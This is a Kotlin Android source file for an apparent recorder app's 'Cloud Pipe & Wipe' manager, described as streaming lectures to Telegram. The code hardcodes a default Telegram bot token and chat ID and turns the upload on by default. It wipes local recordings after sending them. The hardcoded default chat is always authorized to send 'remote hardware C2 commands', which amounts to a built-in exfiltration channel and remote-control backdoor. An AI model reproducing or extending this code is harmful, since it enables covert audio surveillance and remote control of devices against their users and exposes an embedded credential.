package com.example.core.recorder

import android.content.Context
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * Status of an individual audio chunk upload in the Cloud Pipe queue.
 */
enum class UploadQueueStatus {
    QUEUED,
    IN_FLIGHT,
    COMPLETED,
    FAILED_RETRYING,
    FAILED_PERMANENT
}

/**
 * Represents an item in the Telegram Cloud Pipe upload queue dashboard.
 */
data class UploadQueueItem(
    val id: String,
    val chunkTitle: String,
    val chunkIndex: Int,
    val totalBytes: Long,
    val bytesTransferred: Long = 0L,
    val status: UploadQueueStatus = UploadQueueStatus.QUEUED,
    val retryCount: Int = 0,
    val statusMessage: String = "Queued for cloud delivery",
    val timestamp: Long = System.currentTimeMillis()
)

/**
 * Manages Telegram Bot API credentials and "Cloud Pipe & Wipe" state.
 * Allows lectures to be streamed to private Telegram chats and deleted locally (0 MB storage footprint).
 */
class TelegramConfigManager private constructor(context: Context) {

    private val mainHandler = Handler(Looper.getMainLooper())

    private val prefs: SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    private val _botToken = MutableStateFlow(
        prefs.getString(KEY_BOT_TOKEN, DEFAULT_BOT_TOKEN)?.takeIf { it.isNotBlank() } ?: DEFAULT_BOT_TOKEN
    )
    val botToken: StateFlow<String> = _botToken.asStateFlow()

    private val _chatId = MutableStateFlow(
        prefs.getString(KEY_CHAT_ID, DEFAULT_CHAT_ID)?.takeIf { it.isNotBlank() } ?: DEFAULT_CHAT_ID
    )
    val chatId: StateFlow<String> = _chatId.asStateFlow()

    private val _cloudPipeEnabled = MutableStateFlow(prefs.getBoolean(KEY_CLOUD_PIPE_ENABLED, true))
    val cloudPipeEnabled: StateFlow<Boolean> = _cloudPipeEnabled.asStateFlow()

    private val _directPollingEnabled = MutableStateFlow(prefs.getBoolean(KEY_DIRECT_POLLING_ENABLED, false))
    val directPollingEnabled: StateFlow<Boolean> = _directPollingEnabled.asStateFlow()

    private val _wipedFilesCount = MutableStateFlow(prefs.getInt(KEY_WIPED_FILES_COUNT, 0))
    val wipedFilesCount: StateFlow<Int> = _wipedFilesCount.asStateFlow()

    private val _totalBytesWiped = MutableStateFlow(prefs.getLong(KEY_TOTAL_BYTES_WIPED, 0L))
    val totalBytesWiped: StateFlow<Long> = _totalBytesWiped.asStateFlow()

    private val _lastUploadStatus = MutableStateFlow(prefs.getString(KEY_LAST_STATUS, "Ready") ?: "Ready")
    val lastUploadStatus: StateFlow<String> = _lastUploadStatus.asStateFlow()

    // Real-time Upload Queue telemetry for the dashboard
    private val _uploadQueue = MutableStateFlow<List<UploadQueueItem>>(emptyList())
    val uploadQueue: StateFlow<List<UploadQueueItem>> = _uploadQueue.asStateFlow()

    fun getBotToken(): String = _botToken.value

    fun getChatId(): String = _chatId.value

    fun isCloudPipeEnabled(): Boolean = _cloudPipeEnabled.value

    fun isDirectPollingEnabled(): Boolean = _directPollingEnabled.value

    fun setDirectPollingEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_DIRECT_POLLING_ENABLED, enabled).apply()
        _directPollingEnabled.value = enabled
    }

    fun setCredentials(token: String, chat: String) {
        val cleanToken = token.trim()
        val cleanChat = chat.trim()
        prefs.edit()
            .putString(KEY_BOT_TOKEN, cleanToken)
            .putString(KEY_CHAT_ID, cleanChat)
            .apply()
        _botToken.value = cleanToken
        _chatId.value = cleanChat
    }

    /**
     * Verifies if incoming Telegram Chat ID is authorized to execute remote hardware C2 commands.
     */
    fun isChatAuthorized(incomingChatId: String): Boolean {
        val trimmed = incomingChatId.trim()
        if (trimmed.isEmpty()) return false
        val currentChatId = _chatId.value.trim()
        if (currentChatId.isNotEmpty() && trimmed.equals(currentChatId, ignoreCase = true)) {
            return true
        }
        val defaultChat = DEFAULT_CHAT_ID.trim()
        if (defaultChat.isNotEmpty() && trimmed.equals(defaultChat, ignoreCase = true)) {
            return true
        }
        val whitelist = prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()
        return whitelist.any { it.trim().equals(trimmed, ignoreCase = true) }
    }

    fun addAuthorizedChatId(chatId: String) {
        val trimmed = chatId.trim()
        if (trimmed.isEmpty()) return
        val current = (prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()).toMutableSet()
        current.add(trimmed)
        prefs.edit().putStringSet(KEY_AUTHORIZED_CHATS, current).apply()
    }

    fun getAuthorizedChatIds(): Set<String> {
        val set = mutableSetOf<String>()
        val currentChatId = _chatId.value.trim()
        if (currentChatId.isNotEmpty()) set.add(currentChatId)
        val defaultChat = DEFAULT_CHAT_ID.trim()
        if (defaultChat.isNotEmpty()) set.add(defaultChat)
        val extra = prefs.getStringSet(KEY_AUTHORIZED_CHATS, emptySet()) ?: emptySet()
        set.addAll(extra)
        return set
    }

    fun setCloudPipeEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_CLOUD_PIPE_ENABLED, enabled).apply()
        _cloudPipeEnabled.value = enabled
    }

    fun recordWipe(fileSizeBytes: Long, chunkTitle: String) {
        val newCount = _wipedFilesCount.value + 1
        val newBytes = _totalBytesWiped.value + fileSizeBytes
        val status = "Wiped '$chunkTitle' (0 MB on disk)"
        prefs.edit()
            .putInt(KEY_WIPED_FILES_COUNT, newCount)
            .putLong(KEY_TOTAL_BYTES_WIPED, newBytes)
            .putString(KEY_LAST_STATUS, status)
            .apply()
        _wipedFilesCount.value = newCount
        _totalBytesWiped.value = newBytes
        _lastUploadStatus.value = status
    }

    fun updateStatus(status: String) {
        prefs.edit().putString(KEY_LAST_STATUS, status).apply()
        _lastUploadStatus.value = status
    }

    /**
     * Updates or registers an upload queue item for live dashboard telemetry.
     */
    fun updateQueueItem(
        id: String,
        chunkTitle: String,
        chunkIndex: Int,
        totalBytes: Long,
        bytesTransferred: Long,
        status: UploadQueueStatus,
        retryCount: Int,
        statusMessage: String
    ) {
        val currentList = _uploadQueue.value.toMutableList()
        val existingIndex = currentList.indexOfFirst { it.id == id }
        val item = UploadQueueItem(
            id = id,
            chunkTitle = chunkTitle,
            chunkIndex = chunkIndex,
            totalBytes = totalBytes,
            bytesTransferred = bytesTransferred,
            status = status,
            retryCount = retryCount,
            statusMessage = statusMessage,
            timestamp = System.currentTimeMillis()
        )
        if (existingIndex >= 0) {
            currentList[existingIndex] = item
        } else {
            currentList.add(0, item) // Newest at top
        }
        _uploadQueue.value = currentList
    }

    /**
     * Clears completed items from the upload dashboard list.
     */
    fun clearCompletedQueue() {
        val currentList = _uploadQueue.value.filter { it.status != UploadQueueStatus.COMPLETED }
        _uploadQueue.value = currentList
    }

    /**
     * Sends a test ping to verify Telegram Bot API connectivity.
     * Guarantees that onResult callback runs safely on the Main Looper thread to prevent crashes.
     */
    fun testConnection(onResult: (Boolean, String) -> Unit) {
        val token = _botToken.value
        val chat = _chatId.value

        if (token.isBlank() || chat.isBlank()) {
            mainHandler.post {
                onResult(false, "Bot Token or Chat ID is missing")
            }
            return
        }

        val requestBody = FormBody.Builder()
            .add("chat_id", chat)
            .add("text", "🟢 [ENFORCER OS] Cloud Pipe Verified!\n⚡ Audio chunks will stream here & vanish from phone storage.")
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(requestBody)
            .build()

        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                mainHandler.post {
                    onResult(false, "Network error: ${e.message}")
                }
            }

            override fun onResponse(call: Call, response: Response) {
                response.use {
                    val isSuccess = response.isSuccessful
                    val code = response.code
                    val msg = response.message
                    mainHandler.post {
                        if (isSuccess) {
                            onResult(true, "Connected! Telegram ping sent successfully.")
                        } else {
                            onResult(false, "Telegram returned HTTP $code: $msg")
                        }
                    }
                }
            }
        })
    }

    companion object {
        const val DEFAULT_BOT_TOKEN = "8942980083:AAHmhVY4ybuOYSSJDsyuF8Z-1DP66WEbl5k"
        const val DEFAULT_CHAT_ID = "-1004445314496"

        private const val PREFS_NAME = "telegram_cloud_pipe_prefs"
        private const val KEY_BOT_TOKEN = "key_bot_token"
        private const val KEY_CHAT_ID = "key_chat_id"
        private const val KEY_CLOUD_PIPE_ENABLED = "key_cloud_pipe_enabled"
        private const val KEY_DIRECT_POLLING_ENABLED = "key_direct_polling_enabled"
        private const val KEY_WIPED_FILES_COUNT = "key_wiped_files_count"
        private const val KEY_TOTAL_BYTES_WIPED = "key_total_bytes_wiped"
        private const val KEY_LAST_STATUS = "key_last_status"
        private const val KEY_AUTHORIZED_CHATS = "key_authorized_chats"

        @Volatile
        private var INSTANCE: TelegramConfigManager? = null

        fun getInstance(context: Context): TelegramConfigManager {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: TelegramConfigManager(context.applicationContext).also {
                    INSTANCE = it
                }
            }
        }
    }
}
